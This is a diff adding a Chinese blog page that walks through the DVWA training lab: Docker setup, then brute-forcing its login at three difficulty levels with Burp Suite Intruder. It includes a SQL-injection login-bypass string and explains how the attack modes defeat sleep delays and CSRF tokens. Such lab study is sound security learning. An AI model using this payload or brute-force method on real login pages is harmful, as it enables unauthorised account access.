@@ -1,0 +1,1389 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="咩包">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、docker搭建dvwa1.搜索dvwa1docker search dvwa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA全部分学习">
+<meta property="og:url" content="http://example.com/2021/07/06/old/dvwa2/index.html">
+<meta property="og:site_name" content="咩包">
+<meta property="og:description" content="一、docker搭建dvwa1.搜索dvwa1docker search dvwa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104508081.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104846227.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628110149915.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111035077.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111131573.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111321375.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628113608984.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628112008352.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628113846234.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628140838768.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628153013911.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628154629783.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628154752412.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628162413546.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628163432187.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628164448476.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628170043112.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628165536718.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628165704513.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629100902545.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629101516837.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629102717387.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629102807547.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629104132920.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629104639549.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629110648951.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629114943931.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629115142907.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629120339916.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629142330630.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629143700817.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629143829526.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170441299.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170724287.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170830488.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630103301622.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630114602196.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630141520524.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142212280.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142309828.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142350352.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630144247278.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142723198.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630144703536.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630153408797.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630154941333.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630155430279.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630162308195.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630163051152.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630170841603.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630170815030.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630171124024.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630171633004.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630172124237.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630172245715.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210701145031198.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210701145723133.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702104752146.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702104808518.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105150396.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105459200.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105951083.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702110313691.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702110750153.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702111319538.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702111909275.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702113607946.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702114209072.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702114325809.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20210702142548059.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702143231925.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702144128734.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145305587.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145441034.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145558230.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145833451.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702151014456.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702155816655.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702160231683.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702162231237.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702162343418.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702163500790.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702163641113.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702170109179.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702172545641.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706112621857.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142332397.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142419716.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142551875.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142251420.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706150211720.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706151158000.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706153554762.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706154843388.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160610549.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160533944.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160856446.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161153872.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161221694.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161852820.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702173105531.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702173429626.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702174437664.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175353915.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175557494.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175758750.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702180030280.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706102921672.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706104324274.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706105010065.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706105931652.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111059697.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111159270.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111247688.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111555026.png">
+<meta property="og:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111658731.png">
+<meta property="article:published_time" content="2021-07-06T09:13:00.000Z">
+<meta property="article:modified_time" content="2023-03-27T17:11:50.780Z">
+<meta property="article:author" content="咩包">
+<meta property="article:tag" content="旧文章">
+<meta property="article:tag" content="dvwa">
+<meta property="article:tag" content="docker">
+<meta property="article:tag" content="mac">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104508081.png">
+  
+  
+  
+  <title>DVWA全部分学习 - 咩包</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":false,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>咩包</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DVWA全部分学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-07-06 17:13" pubdate>
+          2021年7月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          182 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DVWA全部分学习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="一、docker搭建dvwa"><a href="#一、docker搭建dvwa" class="headerlink" title="一、docker搭建dvwa"></a>一、docker搭建dvwa</h1><h2 id="1-搜索dvwa"><a href="#1-搜索dvwa" class="headerlink" title="1.搜索dvwa"></a>1.搜索dvwa</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker search dvwa</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104508081.png" srcset="/img/loading.gif" lazyload alt="image-20210628104508081"></p>
+<span id="more"></span>
+<h2 id="2-拉取选中的镜像"><a href="#2-拉取选中的镜像" class="headerlink" title="2.拉取选中的镜像"></a>2.拉取选中的镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull citizenstig/dvwa<br></code></pre></td></tr></table></figure>
+
+<h2 id="3-查看镜像是否拉取成功"><a href="#3-查看镜像是否拉取成功" class="headerlink" title="3.查看镜像是否拉取成功"></a>3.查看镜像是否拉取成功</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="4-运行"><a href="#4-运行" class="headerlink" title="4.运行"></a>4.运行</h2><p>临时：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> -it -p 80:80 citizenstig/dvwa</span><br></code></pre></td></tr></table></figure>
+
+<p>创建容器：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> citizenstig/dvwa<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628104846227.png" srcset="/img/loading.gif" lazyload alt="image-20210628104846227"></p>
+<p>默认账号密码：admin&#x2F;password</p>
+<h1 id="二、brute-force（爆破）"><a href="#二、brute-force（爆破）" class="headerlink" title="二、brute force（爆破）"></a>二、brute force（爆破）</h1><p>界面：</p>
+<p>![image-20210628114113729](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210628114113729.png)</p>
+<h2 id="1-low"><a href="#1-low" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628110149915.png" srcset="/img/loading.gif" lazyload alt="image-20210628110149915"></p>
+<p>传入账号和密码，使用sql语句进行查询，并没有进行过滤和验证。</p>
+<p>使用万能密码<code>admin&#39;or&#39;1&#39;=&#39;1-- -</code>可以登陆。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111035077.png" srcset="/img/loading.gif" lazyload alt="image-20210628111035077"></p>
+<p>但属于bruteforce区，所以使用bp爆破。</p>
+<p>使用bp抓包。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111131573.png" srcset="/img/loading.gif" lazyload alt="image-20210628111131573"></p>
+<p>右键sent to intruder，在知道账号为admin的情况下，选择attack type为sniper模式。</p>
+<p>clear清理标记，add选择爆破点。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628111321375.png" srcset="/img/loading.gif" lazyload alt="image-20210628111321375"></p>
+<p>载入payloads</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628113608984.png" srcset="/img/loading.gif" lazyload alt="image-20210628113608984"></p>
+<p>attack！</p>
+<p>排列长度，password和其他payload长度不同。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628112008352.png" srcset="/img/loading.gif" lazyload alt="image-20210628112008352"></p>
+<p>查看回包，显示登录成功：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628113846234.png" srcset="/img/loading.gif" lazyload alt="image-20210628113846234"></p>
+<h2 id="2-medium"><a href="#2-medium" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p>
+<p>![image-20210628114354022](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210628114354022.png)</p>
+<p>源码显示，login failed需要sleep（2）。也就意味着，每一次密码输入错误都会暂停两秒钟，大大增加了爆破的时间。</p>
+<p>爆破试验一下，显然速度变慢了，但并不能阻止爆破。<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628140838768.png" srcset="/img/loading.gif" lazyload alt="image-20210628140838768"></p>
+<p>但密码仍然可以爆破出来。</p>
+<p>输入的用户名和密码使用了mysql_real_escape_string() 函数进行了过滤，sql注入被防御。</p>
+<blockquote>
+<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>下列字符受影响：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a</li>
+</ul>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
+</blockquote>
+<h2 id="3-high"><a href="#3-high" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628153013911.png" srcset="/img/loading.gif" lazyload alt="image-20210628153013911"></p>
+<p>依然使用了mysql_real_escape_string()函数，还使用 stripslashes() 函数删除反斜杠无法进行sql注入。</p>
+<p>比起medium，第一行多了一个checktoken（令牌检查）。</p>
+<blockquote>
+<p>什么是token？</p>
+<p>1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p>
+<p>2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
+<p>3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p>
+</blockquote>
+<p>token用于防止重复提交。</p>
+<p>抓包发现此时的get值多了一个<strong>user_token</strong>。</p>
+<p>尝试多次提交后，返回信息变成了302。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628154629783.png" srcset="/img/loading.gif" lazyload alt="image-20210628154629783"></p>
+<p>显示<strong>csrf token is incorrect</strong>。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628154752412.png" srcset="/img/loading.gif" lazyload alt="image-20210628154752412"></p>
+<p>sent to intruder，attack type选择<strong>pitchfork</strong>。</p>
+<blockquote>
+<p>关于attack的四种模式</p>
+<p><strong>1.Sniper</strong></p>
+<p>这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
+<p><strong>2.Battering ram</strong>  </p>
+<p>这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p>
+<p><strong>3.pitchfork</strong></p>
+<p> 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
+<p><strong>4.Cluster bomb</strong></p>
+<p> 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
+</blockquote>
